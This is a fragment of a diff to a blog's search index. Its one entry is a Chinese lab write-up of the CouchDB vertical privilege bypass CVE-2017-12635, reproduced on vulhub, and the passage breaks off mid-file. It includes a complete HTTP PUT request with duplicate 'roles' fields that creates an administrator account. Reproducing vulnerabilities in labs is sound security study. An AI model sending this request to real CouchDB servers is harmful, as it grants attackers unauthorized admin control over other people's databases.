@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[MS17-010漏洞复现]]></title>
+    <title><![CDATA[Couchdb 垂直权限绕过漏洞（CVE-2017-12635）]]></title>
     <url>%2F2019%2F03%2F04%2FCouchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12635%EF%BC%89%2F</url>
     <content type="text"><![CDATA[Apache CouchDB是一个开源数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。 由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 影响版本Apache CouchDB 小于 1.7.0以及 小于2.1.1 漏洞复现使用 vulhub 进行复现 启动环境 root@ubuntu:/home/vulhub-master/couchdb/CVE-2017-12635# docker-compose up -d 访问 http://your-ip:5984/_utils/ 可看到一个web页面，说明Couchdb已成功启动。但不知道密码，无法登陆。 发送数据包显示只有管理员可以添加用户 发送包含两个roles的数据包，即可绕过限制： PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: ip:5984Accept: /Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108{ “type”: “user”, “name”: “vulhub”, “roles”: [“_admin”], “roles”: [], “password”: “vulhub”} 提交包显示新增用户成功 返回登录页面 输入刚刚创建的用户名及密码 可成功进行登录]]></content>
       <categories>
